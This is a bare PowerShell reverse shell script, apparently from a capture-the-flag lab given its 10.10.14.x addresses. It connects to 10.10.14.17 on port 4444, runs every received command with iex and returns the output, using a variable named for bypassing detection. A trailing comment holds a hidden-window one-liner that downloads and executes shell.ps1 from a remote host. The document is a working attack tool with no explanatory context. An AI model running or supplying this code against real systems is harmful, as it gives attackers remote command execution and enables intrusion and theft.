$client = New-Object System.Net.Sockets.TCPClient('10.10.14.17',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
    $bypass = "ASCII"
    $sendbyte = ([text.encoding]::$bypass).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()

//powershell.exe -nop -w hidden -c IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.15/shell.ps1')
